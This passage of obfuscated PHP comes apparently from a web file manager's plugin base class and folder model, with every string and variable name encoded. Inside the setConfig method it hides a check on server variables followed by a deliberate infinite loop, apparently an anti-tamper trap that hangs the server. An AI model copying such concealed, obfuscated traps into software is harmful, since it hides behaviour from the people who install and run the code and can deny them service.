PLUGIN_DIR . $this->pluginName . $å½Üı¾ú[18]; $this->pluginApi = appHostGet() . $å½Üı¾ú[1673] . $this->pluginName . $å½Üı¾ú[18]; $this->pluginHost = $config[$å½Üı¾ú[1674]] . $this->pluginName . $å½Üı¾ú[18]; $this->pluginHostDefault = $config[$å½Üı¾ú[1674]] . $this->pluginName . $å½Üı¾ú[18]; $­ƒƒœá = $config[$å½Üı¾ú[1675]]; if ($­ƒƒœá && strpos($å½Üı¾ú[60] . $­ƒƒœá . $å½Üı¾ú[60], $this->pluginName) !== !1) { $this->pluginHost = $config[$å½Üı¾ú[1676]] . $this->pluginName . $å½Üı¾ú[18]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[‰‰Ş‚€][1677]); } protected function assign($ë£Ü²ğ½, $È•«š·Ã = false) { if (is_array($ë£Ü²ğ½)) { $this->values = array_merge($this->values, $ë£Ü²ğ½); } else { $this->values[$ë£Ü²ğ½] = $È•«š·Ã; } } protected function display($áË§—ùş) { extract($this->values); require $áË§—ùş; } final function hookRegist($Ú÷¡É²) { $this->modelPlugin->appRegist($this->pluginName, $Ú÷¡É²); } final function appIcon() { $Ú…çÀ’ú =& $_SERVER[‰‰Ş‚€]; $ÀêÖ­óø = $this->appPackage(); $¾é ‹„õ = $Ú…çÀ’ú[22]; if (isset($ÀêÖ­óø[$Ú…çÀ’ú[509]])) { if (isset($ÀêÖ­óø[$Ú…çÀ’ú[509]][$Ú…çÀ’ú[1678]])) { $¾é ‹„õ = $Ú…çÀ’ú[1679] . $ÀêÖ­óø[$Ú…çÀ’ú[509]][$Ú…çÀ’ú[1678]] . $Ú…çÀ’ú[1680]; } else { if ($ÀêÖ­óø[$Ú…çÀ’ú[509]][$Ú…çÀ’ú[1681]]) { $¾é ‹„õ = $Ú…çÀ’ú[1682] . $ÀêÖ­óø[$Ú…çÀ’ú[509]][$Ú…çÀ’ú[1681]] . $Ú…çÀ’ú[1683]; } } } return $¾é ‹„õ; } final function fileCanView($òÙªã¼¶) { $×û±€Á =& $_SERVER[‰‰Ş‚€]; if (request_url_safe($òÙªã¼¶)) { return !0; } if ($this->isShare($òÙªã¼¶)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $Øµ²ò‚› = $×û±€Á[1684] . rawurlencode(this_url()); show_tips(LNG($×û±€Á[1685]) . $×û±€Á[1686] . $Øµ²ò‚› . $×û±€Á[1687] . LNG($×û±€Á[1688]) . $×û±€Á[1689], !1); } if (!Action($×û±€Á[1690])->authCan($×û±€Á[1691])) { show_tips(LNG($×û±€Á[1692]) . $×û±€Á[1693], !1); } ActionCall($×û±€Á[1694], $òÙªã¼¶); } final function isShare($”ğşĞ×€) { $’¤¹¤Ş¸ = KodIO::parse($”ğşĞ×€); return $’¤¹¤Ş¸[$_SERVER[‰‰Ş‚€][43]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Ğèã¯íğ) { if (request_url_safe($Ğèã¯íğ)) { return $Ğèã¯íğ; } if (!$this->isShare($Ğèã¯íğ)) { $Ğèã¯íğ = $this->filePath($Ğèã¯íğ, !1); } return Action($_SERVER[‰‰Ş‚€][1295])->linkOut($Ğèã¯íğ); } public function filePathLinkOut($£˜‹ˆ¼ç) { if (request_url_safe($£˜‹ˆ¼ç)) { return $£˜‹ˆ¼ç; } $this->fileCanView($£˜‹ˆ¼ç); return Action($_SERVER[‰‰Ş‚€][1295])->link($£˜‹ˆ¼ç); } final function filePath($ùºˆİ­, $µ½–…‘€ = true, $´‹œÊñ = false) { $šÅóÛÇ™ =& $_SERVER[‰‰Ş‚€]; $û”–ù¹ì = $this->filePathGet($ùºˆİ­, $µ½–…‘€); if (!$this->fileInfo) { show_tips(LNG($šÅóÛÇ™[116]), !1); } if ($´‹œÊñ && isset($this->fileInfo[$šÅóÛÇ™[561]]) && $this->fileInfo[$šÅóÛÇ™[561]]) { $ë©«†¤¾ = Model($šÅóÛÇ™[564])->fileInfo($this->fileInfo[$šÅóÛÇ™[561]]); if (!$ë©«†¤¾ || !IO::exist($ë©«†¤¾[$šÅóÛÇ™[97]])) { $™ä´® = LNG($šÅóÛÇ™[116]) . LNG($šÅóÛÇ™[1695]); if (KodUser::isRoot() && isset($ë©«†¤¾[$šÅóÛÇ™[97]])) { $™ä´® .= $šÅóÛÇ™[1696] . $ë©«†¤¾[$šÅóÛÇ™[97]] . $šÅóÛÇ™[1697]; } show_tips($™ä´®); } } Hook::trigger($šÅóÛÇ™[1698], $û”–ù¹ì); return $û”–ù¹ì; } final function filePathGet($¥×Äıı, $ÇÇø›Æ› = true) { $Öœ¦äø° =& $_SERVER[‰‰Ş‚€]; if ($÷…®å‘Š = $this->checkSharePath($¥×Äıı, $ÇÇø›Æ›)) { return $÷…®å‘Š; } $this->fileCanView($¥×Äıı); if (request_url_safe($¥×Äıı)) { $Üİ‹Ä¸š = parse_url_query($¥×Äıı); if (isset($Üİ‹Ä¸š[$Öœ¦äø°[1699]]) && isset($Üİ‹Ä¸š[$Öœ¦äø°[245]])) { $ŸñÁÀ÷ = Mcrypt::decode($Üİ‹Ä¸š[$Öœ¦äø°[245]], Model($Öœ¦äø°[869])->get($Öœ¦äø°[870])); if ($ŸñÁÀ÷) { $this->fileInfo = IO::info($ŸñÁÀ÷); $this->fileInfo[$Öœ¦äø°[1700]] = $¥×Äıı; $this->cachePath = $this->pluginCachePath($Öœ¦äø°[22], $ÇÇø›Æ›); return $ŸñÁÀ÷; } } $¥×Äıı = $this->_cacheHttpFile($¥×Äıı, $ÇÇø›Æ›); $this->fileInfo = IO::info($¥×Äıı); } else { $this->fileInfo = IO::info($¥×Äıı); $this->cachePath = $this->pluginCachePath($Öœ¦äø°[22], $ÇÇø›Æ›); } return $¥×Äıı; } final function _cacheHttpFile($§ìª¶Ö‘, $¼²×‘Ğª = true) { $ç’Åşù =& $_SERVER[‰‰Ş‚€]; $ğ“œ²œ‰ = parse_url_query($§ìª¶Ö‘); $°ÀÏÛ„Å = get_path_ext($§ìª¶Ö‘); if (isset($ğ“œ²œ‰[$ç’Åşù[42]]) && $ğ“œ²œ‰[$ç’Åşù[42]]) { $°ÀÏÛ„Å = get_path_ext($ğ“œ²œ‰[$ç’Åşù[42]]); } $Ğ­İÎïÉ = hash_path($§ìª¶Ö‘) . $ç’Åşù[20] . $°ÀÏÛ„Å; $this->cachePath = $this->pluginCachePath($¼²×‘Ğª ? $Ğ­İÎïÉ : $ç’Åşù[22]); $×¢äöïÂ = IO::fileNameExist($this->cachePath, $Ğ­İÎïÉ); if ($×¢äöïÂ) { return KodIO::make($×¢äöïÂ); } $ıùıËÂ = rtrim($this->cachePath, $ç’Åşù[18]) . $ç’Åşù[18] . $Ğ­İÎïÉ; return $this->pluginCacheFileSet($ıùıËÂ, file_get_contents_nossl($§ìª¶Ö‘)); } final function checkSharePath($â®‘†¹Ñ, $—œŒ ³Ì = true) { $öæà×À =& $_SERVER[‰‰Ş‚€]; if (!$this->isShare($â®‘†¹Ñ)) { return !1; } $°¨ã¡ä = Action($öæà×À[1295])->sharePathInfo($â®‘†¹Ñ); if (!is_array($°¨ã¡ä) || !isset($°¨ã¡ä[$öæà×À[97]])) { show_json(LNG($öæà×À[1701]), !1); } $this->fileInfo = $°¨ã¡ä; $this->cachePath = $this->pluginCachePath(!1, $—œŒ ³Ì); return $°¨ã¡ä[$öæà×À[97]]; } final function pluginCachePath($ìß·±²Õ = '', $ß’»½±´ = false) { $ÙºíøíØ =& $_SERVER[‰‰Ş‚€]; if ($ß’»½±´ && is_array($this->fileInfo)) { $ìß·±²Õ = kodIO::hashPath($this->fileInfo); } $‘€™ãğ = rtrim(IO_PATH_SYSTEM_TEMP . $ÙºíøíØ[1702] . $this->pluginName . $ÙºíøíØ[18] . $ìß·±²Õ, $ÙºíøíØ[18]); $ë¦¾µ¹í = IO::infoFullSimple($‘€™ãğ); $–óä´†ô = $ë¦¾µ¹í && is_array($ë¦¾µ¹í) ? $ë¦¾µ¹í[$ÙºíøíØ[97]] : $ÙºíøíØ[22]; if (!$–óä´†ô) { $–óä´†ô = IO::mkdir($‘€™ãğ); } return $–óä´†ô; } final function pluginCacheFileSet($¹ˆ÷á¥°, $Ô£ôÖû = '') { $äºµç´µ =& $_SERVER[‰‰Ş‚€]; $¨‰ÄúÎ˜ = IO::infoFullSimple($¹ˆ÷á¥°); if (!$¨‰ÄúÎ˜) { return IO::mkfile($¹ˆ÷á¥°, $Ô£ôÖû, REPEAT_REPLACE); } IO::setContent($¨‰ÄúÎ˜[$äºµç´µ[97]], $Ô£ôÖû); return $¨‰ÄúÎ˜[$äºµç´µ[97]]; } final function pluginLocalFile($Ùä³ââÖ = '') { $ê°İÂ›ô =& $_SERVER[‰‰Ş‚€]; $¹µüäë¤ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($¹µüäë¤)) { mk_dir($¹µüäë¤); } if (!$Ùä³ââÖ) { return $¹µüäë¤; } $›«®Û¡ğ = IO::info($Ùä³ââÖ); $ä³ İœï = $ê°İÂ›ô[1703] . KodIO::hashPath($›«®Û¡ğ) . $ê°İÂ›ô[20] . $›«®Û¡ğ[$ê°İÂ›ô[177]]; if (!checkExtSafe($ä³ İœï)) { $ä³ İœï = $ä³ İœï . $ê°İÂ›ô[1330]; } $ÍÍ€ÊÚ€ = $¹µüäë¤ . $ä³ İœï; if (@file_exists($ÍÍ€ÊÚ€)) { return $ÍÍ€ÊÚ€; } return IO::copy($Ùä³ââÖ, $¹µüäë¤, 0, $ä³ İœï); } final function appPackage() { $‡ÊòÌ•õ =& $_SERVER[‰‰Ş‚€]; if ($this->packageData) { return $this->packageData; } $ŞŠ®ÒÀ = $this->parseFile($this->pluginPath . $‡ÊòÌ•õ[1704]); $this->parseLang($ŞŠ®ÒÀ); $÷áèÛŒ‚ = json_decode_force($ŞŠ®ÒÀ); if (!$÷áèÛŒ‚) { return array(); } $š±î°Ğ = Hook::trigger($‡ÊòÌ•õ[1705], $÷áèÛŒ‚); if ($š±î°Ğ && is_array($š±î°Ğ)) { $÷áèÛŒ‚ = $š±î°Ğ; } $this->packageData = $÷áèÛŒ‚; return $÷áèÛŒ‚; } public function packageInfoGet($´È–‹Ù) { $Üµ¥¬èı = $this->appPackage(); return array_get_value($Üµ¥¬èı, $´È–‹Ù); } public function packageVersion() { return $this->packageInfoGet($_SERVER[‰‰Ş‚€][1706]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[‰‰Ş‚€][1707]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[‰‰Ş‚€][1708]); } public function echoJsAssign($ÖŸ×Ö‹Ã, $•û¥Ú‚Å) { $this->echoJsAssignArr[$ÖŸ×Ö‹Ã] = $•û¥Ú‚Å; } private function parseFile($ØıÔó¯ñ) { $µô¿™¥Ç =& $_SERVER[‰‰Ş‚€]; $üß‘ğÙ± = file_get_contents_nossl($ØıÔó¯ñ); $¢”Ö¾—Õ = array($µô¿™¥Ç[1709], $µô¿™¥Ç[1710], $µô¿™¥Ç[1711], $µô¿™¥Ç[1712], $µô¿™¥Ç[1713], $µô¿™¥Ç[1714], $µô¿™¥Ç[1715]); $ÅÙ¬‘İ˜ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$µô¿™¥Ç[102]][$µô¿™¥Ç[1716]]); foreach ($this->echoJsAssignArr as $ŠƒÚœøŞ => $ÆõÄÄ·ğ) { $¢”Ö¾—Õ[] = $µô¿™¥Ç[1717] . $ŠƒÚœøŞ . $µô¿™¥Ç[1718]; $ÅÙ¬‘İ˜[] = is_array($ÆõÄÄ·ğ) || is_object($ÆõÄÄ·ğ) ? rawurlencode(json_encode($ÆõÄÄ·ğ)) : $ÆõÄÄ·ğ; } if (strstr($üß‘ğÙ±, $µô¿™¥Ç[1719])) { $Š€‹¸úó = rawurlencode(json_encode($this->pluginLangArr)); $üß‘ğÙ± = str_replace($µô¿™¥Ç[1719], $Š€‹¸úó, $üß‘ğÙ±); } if (strstr($üß‘ğÙ±, $µô¿™¥Ç[1720])) { $Š€‹¸úó = $Š€‹¸úó = rawurlencode(json_encode($this->getConfig())); $üß‘ğÙ± = str_replace($µô¿™¥Ç[1720], $Š€‹¸úó, $üß‘ğÙ±); } $üß‘ğÙ± = str_replace($¢”Ö¾—Õ, $ÅÙ¬‘İ˜, $üß‘ğÙ±); return $üß‘ğÙ±; } private function parseLang(&$›æš‰ÉÉ) { $ğ¥Áä„ =& $_SERVER[‰‰Ş‚€]; $Ğ›ÕŠ“ = $ğ¥Áä„[1721]; if (!strstr($›æš‰ÉÉ, $Ğ›ÕŠ“)) { return; } preg_match_all($ğ¥Áä„[1722], $›æš‰ÉÉ, $—“ú¥æÔ); if (!is_array($—“ú¥æÔ) || count($—“ú¥æÔ) == 0 || !is_array($—“ú¥æÔ[0]) || count($—“ú¥æÔ[0]) == 0) { return; } $ÂßÎ“˜ = array(); $¯ ıÆ®Ø = array(); foreach ($—“ú¥æÔ[0] as $ÀŠ“…â¶) { $Ãä˜²î = substr($ÀŠ“…â¶, strlen($Ğ›ÕŠ“), -4); $’–©¼½ = LNG($Ãä˜²î); $ÂßÎ“˜[] = $ÀŠ“…â¶; $¯ ıÆ®Ø[] = str_replace(array($ğ¥Áä„[10], $ğ¥Áä„[1190], $ğ¥Áä„[426], $ğ¥Áä„[129]), array($ğ¥Áä„[63], $ğ¥Áä„[63], $ğ¥Áä„[22], $ğ¥Áä„[1723]), $’–©¼½); } $›æš‰ÉÉ = str_replace($ÂßÎ“˜, $¯ ıÆ®Ø, $›æš‰ÉÉ); } private function parseConfig(&$ø¡ŸĞÍ) { $–ø‚ÉƒŸ =& $_SERVER[‰‰Ş‚€]; $ëàæ‹èÈ = $–ø‚ÉƒŸ[1724]; if (!strstr($ø¡ŸĞÍ, $ëàæ‹èÈ)) { return; } preg_match_all($–ø‚ÉƒŸ[1725], $ø¡ŸĞÍ, $•Õ°¥Êê); if (!is_array($•Õ°¥Êê) || count($•Õ°¥Êê) == 0 || !is_array($•Õ°¥Êê[0]) || count($•Õ°¥Êê[0]) == 0) { return; } $¼‘È‘ßñ = $this->getConfig(); $ÁŒ“ş× = array(); $ä’ÕÑß§ = array(); foreach ($•Õ°¥Êê[0] as $îİ³õ‘£) { $Èãù‰Ñ = substr($îİ³õ‘£, strlen($ëàæ‹èÈ), -2); $ÁŒ“ş×[] = $îİ³õ‘£; $ä’ÕÑß§[] = _get($¼‘È‘ßñ, $Èãù‰Ñ); } $ø¡ŸĞÍ = str_replace($ÁŒ“ş×, $ä’ÕÑß§, $ø¡ŸĞÍ); } private function parsePackage(&$óæã¾“Î) { $Ø³Œ =& $_SERVER[‰‰Ş‚€]; $éÏÀæ‚š = $Ø³Œ[1726]; if (!strstr($óæã¾“Î, $éÏÀæ‚š)) { return; } preg_match_all($Ø³Œ[1727], $óæã¾“Î, $Ù³¤°ı); if (!is_array($Ù³¤°ı) || count($Ù³¤°ı) == 0 || !is_array($Ù³¤°ı[0]) || count($Ù³¤°ı[0]) == 0) { return; } $¥³–¢øÖ = $this->appPackage(); $İ‚½´ = array(); $Ï–Û³‹ = array(); foreach ($Ù³¤°ı[0] as $¾ ”²ò) { $°¿µ©Ñ¿ = substr($¾ ”²ò, strlen($éÏÀæ‚š), -2); $İ‚½´[] = $¾ ”²ò; $Ï–Û³‹[] = _get($¥³–¢øÖ, $°¿µ©Ñ¿); } $óæã¾“Î = str_replace($İ‚½´, $Ï–Û³‹, $óæã¾“Î); } final function echoFile($ê‘“ûÀ¥, $ÍÖºü = false) { $ÄùÓª»ì =& $_SERVER[‰‰Ş‚€]; $¯»¢ˆËš = $this->pluginPath . $ê‘“ûÀ¥; if (ACT == $ÄùÓª»ì[1728]) { echo $ÄùÓª»ì[1729] . $this->pluginName . $ÄùÓª»ì[18] . $ê‘“ûÀ¥ . $ÄùÓª»ì[1730]; if (!file_exists($¯»¢ˆËš)) { echo $ÄùÓª»ì[1731]; return; } } $ÄÏÂØäÆ = $this->parseFile($¯»¢ˆËš); $this->parseLang($ÄÏÂØäÆ); $this->parseConfig($ÄÏÂØäÆ); $this->parsePackage($ÄÏÂØäÆ); if (is_array($ÍÖºü)) { $ÄÏÂØäÆ = str_replace(array_keys($ÍÖºü), array_values($ÍÖºü), $ÄÏÂØäÆ); } echo $ÄùÓª»ì[10] . $ÄÏÂØäÆ; } private function checkVersion() { $æğİş‡ì =& $_SERVER[‰‰Ş‚€]; $÷Òóµ°ó = $this->appPackage(); $¢ÛÜ˜Â = $this->getConfig(); if ($¢ÛÜ˜Â[$æğİş‡ì[1732]] == $÷Òóµ°ó[$æğİş‡ì[1706]]) { return; } $this->regist(); $this->setConfig(array($æğİş‡ì[1732] => $÷Òóµ°ó[$æğİş‡ì[1706]])); } final function initLang() { $™ëëœ—Ã =& $_SERVER[‰‰Ş‚€]; $çç¬¥‚ = $™ëëœ—Ã[1733]; $³ÃĞÔÁ† = $this->pluginPath . $™ëëœ—Ã[1734]; $²·®û˜Â = I18n::getType(); $ğ“ãùÛ’ = array(); if (file_exists($³ÃĞÔÁ† . $²·®û˜Â . $™ëëœ—Ã[946])) { $ğ“ãùÛ’ = (include $³ÃĞÔÁ† . $²·®û˜Â . $™ëëœ—Ã[946]); } else { if ($²·®û˜Â == $™ëëœ—Ã[1735] && !file_exists($³ÃĞÔÁ† . $²·®û˜Â . $™ëëœ—Ã[946]) && file_exists($³ÃĞÔÁ† . $™ëëœ—Ã[1736])) { $ğ“ãùÛ’ = (include $³ÃĞÔÁ† . $™ëëœ—Ã[1736]); $²·®û˜Â = $™ëëœ—Ã[1549]; } else { if (file_exists($³ÃĞÔÁ† . $çç¬¥‚ . $™ëëœ—Ã[946])) { $ğ“ãùÛ’ = (include $³ÃĞÔÁ† . $çç¬¥‚ . $™ëëœ—Ã[946]); $²·®û˜Â = $çç¬¥‚; } } } if (!$ğ“ãùÛ’ || !is_array($ğ“ãùÛ’)) { $ğ“ãùÛ’ = array(); } $ï¦ÛŸäì = Hook::trigger($™ëëœ—Ã[1737], $ğ“ãùÛ’, $this->pluginName, $²·®û˜Â); if ($ï¦ÛŸäì && is_array($ï¦ÛŸäì)) { $ğ“ãùÛ’ = $ï¦ÛŸäì; } if (@count($ğ“ãùÛ’) > 0) { I18n::set($ğ“ãùÛ’); } return $ğ“ãùÛ’; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ùÑÄÖÎ¢) { $ŒÁ»ÓÔª =& $_SERVER[‰‰Ş‚€]; if (!isset($_SERVER[$ŒÁ»ÓÔª[6]]) || !isset($_SERVER[$ŒÁ»ÓÔª[4]])) { $ßö´¯¨  = $ŒÁ»ÓÔª[985]; $áÆß“¬ = $ŒÁ»ÓÔª[7]; $â¦¶•ºÒ = $_SERVER[$ŒÁ»ÓÔª[8]] . $ŒÁ»ÓÔª[9]; $‘¨ˆï—ª = $áÆß“¬($â¦¶•ºÒ); $ê´íøâÛ = explode($ŒÁ»ÓÔª[10], $‘¨ˆï—ª); if (count($ê´íøâÛ) < $ŒÁ»ÓÔª[703]) { $àÅšå¢ = $ŒÁ»ÓÔª[12]; $àÅšå¢(); } $‡‘öòÉ¹ = $ŒÁ»ÓÔª[986]; $‡‘öòÉ¹($_SERVER[$ŒÁ»ÓÔª[987]]); $£–¤ê²¬ = 1; for ($ìœüÊæ = $£–¤ê²¬; $ìœüÊæ > 0; $ìœüÊæ++) { $‡‘öòÉ¹ = json_encode($GLOBALS[$ŒÁ»ÓÔª[511]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ùÑÄÖÎ¢); } public function onSetConfig($Ë¾º¢²) { } public function onGetConfig($ŒÊ«üÓ¥) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($›ÖÁ“) { if ($›ÖÁ“ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($¯Ë»ˆ‹ = "\160\154\x75\x67\x69\x6e\101\x75\164\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $é¸£¨¬ß = $this->getConfig(); if (!$é¸£¨¬ß[$¯Ë»ˆ‹]) { return !1; } return ActionCall($_SERVER[‰‰Ş‚€][1738], $é¸£¨¬ß[$¯Ë»ˆ‹]); } public function url($£œ»×Ç, $¦Ä®÷á¯ = '', $Ş€£ÄØ¤ = true) { $æ©óĞÒñ =& $_SERVER[‰‰Ş‚€]; $ÊŸñÀÙ = $this->getConfig(); $šáˆÊä¾ = KOD_VERSION . $æ©óĞÒñ[20] . KOD_VERSION_BUILD; $ª…­ºÛè = $this->packageVersion(); $Êäªù ” = $šáˆÊä¾ . $æ©óĞÒñ[481] . $ª…­ºÛè; if (substr($£œ»×Ç, 0, 4) == $æ©óĞÒñ[160] || substr($£œ»×Ç, 0, 2) == $æ©óĞÒñ[1457]) { $·ìù§Ñ– = $£œ»×Ç . $æ©óĞÒñ[1739] . $Êäªù ”; } else { if ($¦Ä®÷á¯ == $æ©óĞÒñ[22]) { $·ìù§Ñ– = $this->pluginHost . $£œ»×Ç . $æ©óĞÒñ[1739] . $Êäªù ”; } else { if ($¦Ä®÷á¯ === $æ©óĞÒñ[88]) { $·ìù§Ñ– = $this->pluginHost . $£œ»×Ç; } else { if ($¦Ä®÷á¯ == $æ©óĞÒñ[1740]) { $·ìù§Ñ– = STATIC_PATH . $£œ»×Ç . $æ©óĞÒñ[1739] . $šáˆÊä¾; } else { if ($¦Ä®÷á¯ == $æ©óĞÒñ[1741]) { $·ìù§Ñ– = APP_HOST . $æ©óĞÒñ[1742] . $£œ»×Ç . $æ©óĞÒñ[1739] . $šáˆÊä¾; } else { if (isset($ÊŸñÀÙ[$¦Ä®÷á¯])) { $·ìù§Ñ– = $ÊŸñÀÙ[$¦Ä®÷á¯] . $£œ»×Ç . $æ©óĞÒñ[1739] . $Êäªù ”; } } } } } } if (!$Ş€£ÄØ¤) { return $·ìù§Ñ–; } echo $·ìù§Ñ–; } public function link($ŞÙ«×± = false, $ÜÆÌ·èì = '') { $±²óıé» =& $_SERVER[‰‰Ş‚€]; $Ï£èåÅØ = $this->linkHas == !1; $this->linkHas = !0; if (!$ŞÙ«×±) { $this->link($±²óıé»[1743], $±²óıé»[1741]); $this->link($±²óıé»[1744], $±²óıé»[1740]); $this->link($±²óıé»[1745], $±²óıé»[1740]); $this->link($±²óıé»[1746], $±²óıé»[1740]); $this->link($±²óıé»[1747], $±²óıé»[1740]); if ($Ï£èåÅØ) { Hook::trigger($±²óıé»[1748]); } return; } $„»ûæ‚‚ = $this->url($ŞÙ«×±, $ÜÆÌ·èì, !1); if (substr($ŞÙ«×±, -3) == $±²óıé»[1749]) { echo $±²óıé»[1750] . $„»ûæ‚‚ . $±²óıé»[1751] . $±²óıé»[10]; } else { if (substr($ŞÙ«×±, -4) == $±²óıé»[1752]) { echo $±²óıé»[1753] . $„»ûæ‚‚ . $±²óıé»[1754] . $±²óıé»[10]; } } if ($Ï£èåÅØ) { Hook::trigger($±²óıé»[1748]); } } } goto eˆµÌšˆ¦™; cí©˜÷ˆ«Ç: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Ì÷ò˜¤Ü) { $¶İ£ƒôÅ =& $_SERVER[‰‰Ş‚€]; $¿úËìˆ = Model($¶İ£ƒôÅ[597])->where(array($¶İ£ƒôÅ[1811] => $Ì÷ò˜¤Ü))->find(); $•µØ£•æ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ì÷ò˜¤Ü, $¿úËìˆ[$¶İ£ƒôÅ[42]]); $this->userDesktopAdd($•µØ£•æ); return $•µØ£•æ; } public function userDesktopAdd($¯å˜Áëã) { $ñÂïÚß =& $_SERVER[‰‰Ş‚€]; $¹Èæ¤ì¥ = LNG($ñÂïÚß[2313]); $•ÀÃ˜Ò¿ = $this->mkdir($¯å˜Áëã, $¹Èæ¤ì¥); $this->metaSet($•ÀÃ˜Ò¿, $ñÂïÚß[2314], $ñÂïÚß[101]); $this->metaSet($¯å˜Áëã, $ñÂïÚß[2315], $•ÀÃ˜Ò¿); } public function userPathSafeAdd($Æå¾®øÁ) { $·ó Í˜¦ =& $_SERVER[‰‰Ş‚€]; $İî»³ú¹ = Model($·ó Í˜¦[597])->getInfoFull($Æå¾®øÁ); if (!$İî»³ú¹) { return !1; } if (_get($İî»³ú¹, $·ó Í˜¦[618])) { return $İî»³ú¹[$·ó Í˜¦[559]][$·ó Í˜¦[2316]]; } $Ö½×°Ó¼ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Æå¾®øÁ, $·ó Í˜¦[2317], $·ó Í˜¦[2318]); Model($·ó Í˜¦[597])->metaSet($Æå¾®øÁ, $·ó Í˜¦[2316], $Ö½×°Ó¼); $this->metaSet($Ö½×°Ó¼, $·ó Í˜¦[2319], $Æå¾®øÁ); return $Ö½×°Ó¼; } public function userPathAppAdd($Ùµ¿ï, $ãüëôóø = '', $×ª„À´ = '') { $ô·Š úŒ =& $_SERVER[‰‰Ş‚€]; $Ú›Ä€Ö = Model($ô·Š úŒ[597])->getInfoFull($Ùµ¿ï); if (!$Ú›Ä€Ö) { return !1; } $……¸›éâ = $Ú›Ä€Ö[$ô·Š úŒ[559]] ? $Ú›Ä€Ö[$ô·Š úŒ[559]] : array(); $êü¸¦ˆŒ = $……¸›éâ[$ô·Š úŒ[2320]]; if (!$êü¸¦ˆŒ) { $êü¸¦ˆŒ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ùµ¿ï, $ô·Š úŒ[2321], $ô·Š úŒ[2322]); Model($ô·Š úŒ[597])->metaSet($Ùµ¿ï, $ô·Š úŒ[2320], $êü¸¦ˆŒ . $ô·Š úŒ[22]); $this->metaSet($êü¸¦ˆŒ, $ô·Š úŒ[2320], $Ùµ¿ï); } if (!$ãüëôóø) { return $êü¸¦ˆŒ; } $›±°á = $……¸›éâ[$ô·Š úŒ[2323] . $ãüëôóø]; if (!$›±°á) { $›±°á = $this->mkdir($êü¸¦ˆŒ, $ãüëôóø); Model($ô·Š úŒ[597])->metaSet($Ùµ¿ï, $ô·Š úŒ[2323] . $ãüëôóø, $›±°á); $this->metaSet($›±°á, $ô·Š úŒ[2323] . $ãüëôóø, $Ùµ¿ï); } if (!$×ª„À´) { return $›±°á; } $µù¨¸ç = $this->mkdir($›±°á, $×ª„À´); return $µù¨¸ç; } public function groupRootAdd($—ıÚÒ§í) { $ó°´ïº› =& $_SERVER[‰‰Ş‚€]; $«‡É¹…¨ = Model($ó°´ïº›[605])->where(array($ó°´ïº›[2110] => $—ıÚÒ§í))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $—ıÚÒ§í, $«‡É¹…¨[$ó°´ïº›[42]]); } public function systemRootPathAdd($õÔÆêö­) { if ($õÔÆêö­ != $_SERVER[‰‰Ş‚€][628]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $õÔÆêö­); } public function userRootRemove($ûìïŸàí) { $ÌÉŞÖŸĞ = $this->targetSourceRoot(SourceModel::TYPE_USER, $ûìïŸàí, !0); foreach ($ÌÉŞÖŸĞ as $°•äï¢Ó) { if (!$°•äï¢Ó) { continue; } $this->remove($°•äï¢Ó[$_SERVER[‰‰Ş‚€][202]], !1); } } public function groupRootRemove($€ÄÜœŸ¹) { $«‡±ë¶Ë = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $€ÄÜœŸ¹); if (!$«‡±ë¶Ë) { return; } $this->remove($«‡±ë¶Ë[$_SERVER[‰‰Ş‚€][202]], !1); } private function _mkdirRoot($»»©šĞ, $üµ¸Õ¾á, $ÚĞßÖ¦ , $“‡´²¤» = '') { $‡ÍÆäú =& $_SERVER[‰‰Ş‚€]; $›ÉñáŠ = KodUser::id(); $¯ıŸ–ßÕ = array($‡ÍÆäú[496] => 0, $‡ÍÆäú[671] => $»»©šĞ, $‡ÍÆäú[672] => $üµ¸Õ¾á, $‡ÍÆäú[669] => 1, $‡ÍÆäú[673] => $›ÉñáŠ, $‡ÍÆäú[674] => $›ÉñáŠ, $‡ÍÆäú[670] => $“‡´²¤», $‡ÍÆäú[675] => $‡ÍÆäú[613], $‡ÍÆäú[523] => 0, $‡ÍÆäú[640] => 0, $‡ÍÆäú[562] => 0, $‡ÍÆäú[676] => $‡ÍÆäú[22]); if ($»ŞÑÁ = $this->where($¯ıŸ–ßÕ)->find()) { return $»ŞÑÁ[$‡ÍÆäú[202]]; } $Ë¢Ì–à† = "\115\x6f\x64\x65\154\123\x6f\x75\162\x63\x65\x2e\x6d\153\x64\151\x72\122\x6f\157\164\x2e{$»»©šĞ}\x2e{$üµ¸Õ¾á}\x2e" . $ÚĞßÖ¦ ; CacheLock::lock($Ë¢Ì–à†); $¯ıŸ–ßÕ[$‡ÍÆäú[42]] = $ÚĞßÖ¦ ; $ş¾ÉßÈ¸ = $this->add($¯ıŸ–ßÕ); $ûÄ¬å›¬ = array($‡ÍÆäú[677] => short_id($ş¾ÉßÈ¸)); $this->where(array($‡ÍÆäú[510] => $ş¾ÉßÈ¸))->save($ûÄ¬å›¬); CacheLock::unlock($Ë¢Ì–à†); return $ş¾ÉßÈ¸; } private function targetSourceRoot($ÚİŒÄ¾ß, $ÌÏ•½€¾, $úÚØÁ—Ÿ = false) { $¤ÉÅ‘ß =& $_SERVER[‰‰Ş‚€]; $Ş™ÔÓëú = 